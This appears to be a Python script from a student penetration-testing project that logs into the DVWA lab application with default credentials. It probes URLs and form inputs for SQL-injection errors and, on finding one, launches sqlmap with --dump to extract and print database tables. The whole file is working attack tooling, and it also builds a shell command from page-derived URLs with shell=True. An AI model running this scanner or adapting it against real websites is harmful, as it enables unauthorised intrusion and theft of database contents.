import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from pprint import pprint
from subprocess import Popen, PIPE

s = requests.Session()

def getDVWALogin():
	username = 'admin'
	password = 'password'

	f = open('botrk_back\dirsearch_output_test.txt', 'r')
	file_contents = f.readlines()

	for line in file_contents:
		address = line[13:].split(' ')[0].strip()
		if "login.php" in address:
			with requests.Session() as session:
				html = session.get(address)
				html_parsed = BeautifulSoup(html.text, "html.parser")
				user_token = html_parsed.find('input', { "type" : "hidden" })['value']
				creds = {
					"username"   : username,
					"password"   : password,
					"Login"      : "Submit",
					"user_token" : user_token
				}
				request = session.post(address, data = creds)
				cookie = html.cookies.get_dict();session.delete(address)
	return cookie

def get_all_forms(url):
    """Given a `url`, it returns all forms from the HTML content"""
    soup = BeautifulSoup(s.get(url).content, "html.parser")

    return soup.find_all("form")


def get_form_details(form):
    # Cette fonction va parcourir l'html pour trouver les détails des forms
    
    details = {}

    # Ici on récupère la méthode http du for
    method = form.attrs.get("method", "get").lower()

    # Récupération des autres détails du form
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
    
    details["method"] = method
    details["inputs"] = inputs
    return details


def is_vulnerable(response):
    # Cette fonction compare la reponse de l'appel avec le message d'erreur MySQL
    error ="you have an error in your sql syntax;"
    if error in response.content.decode().lower():
        return True
    return False


def scan_sql_injection():
    report = ""
    file = open('botrk_back\dirsearch_output_test.txt', 'r')
    file_contents = file.readlines()
    address = ""
    url = ""
    s.cookies.set("PHPSESSID", getDVWALogin()['PHPSESSID'])
    s.cookies.set("security", "low")

    # Recherche de l'URL pour l'injection SQL
    for line in file_contents:
        address = line[13:].split(' ')[0].strip()

        # Vérification de la validité de l'url
        if "http" in address and not (address.endswith(".php") or address.endswith(".txt") or address.endswith(".ini")):
            url = address
            print("[!] Trying", url)
            for c in "\"'":
                # Ajout de caractères pouvant révéler une vulnerabilitées SQL
                detectUrl = f"{url}{c}"
                res = s.get(detectUrl)
                if is_vulnerable(res):
                    print("\t[✅] SQL Injection vulnerability detected, link:", detectUrl)
                    return
            
            # Recover the forms of all pages
            forms = get_all_forms(url)
            if len(forms) != 0:
                print(f"\t[✅] Detected {len(forms)} forms on {url}.")
            
            # Boucle for d'essais d'injection dans les forms
            for form in forms:
                form_details = get_form_details(form)
                data = {}
                sqlmapData = {}
                for input_tag in form_details["inputs"]:
                    if input_tag["value"] or input_tag["type"] == "hidden":
                        try:
                            data[input_tag["name"]] = input_tag["value"] + "'"
                            sqlmapData[input_tag["name"]] = input_tag["value"]
                        except:
                            pass
                    elif input_tag["type"] != "submit":
                        data[input_tag["name"]] = f"Submit'"
                        sqlmapData[input_tag["name"]] = f"Submit"
                if form_details["method"] == "post":
                    res = s.post(url, data=data)
                elif form_details["method"] == "get":
                    res = s.get(url, params=data)

                # Verification de la réponse pour déterminer la possibilité de l'injection
                if is_vulnerable(res):
                    res = s.get(url, params=sqlmapData)
                    print("\t[✅] SQL Injection vulnerability detected, link:", res.url)
                    print('\t[i] Trying to dump database using sqlmap:')
                    print('\t\tInjection on ' + res.url)
                    command = "sqlmap -u '" + res.url + "' --cookie='PHPSESSID=" + getDVWALogin()['PHPSESSID'] + ";security=low' --dump --batch --output-dir='dump/'"
                    print(command)
                    process = Popen(command, shell=True, stdout=PIPE)
                    report += res.url + " is an injectable form where we dumped this:"
                    for line in process.stdout:
                        if 'dumped to CSV file' in str(line): 
                            table = str(line).split(' ')[3]
                            path = str(line).split(' ')[8]
                            table = table[1:len(table)-1]
                            path = path[1:len(path)-4]
                            print('The '+ table + ' SQL table has been dumped:')
                            report += 'The '+ table + ' SQL table has been dumped:'
                            f = open(path, 'r')
                            dump = f.read().replace(',', '\t|')
                            print(dump[:len(dump)-1])
                            report += dump[:len(dump)-1]
                    print('#####################################')
                    break   

scan_sql_injection()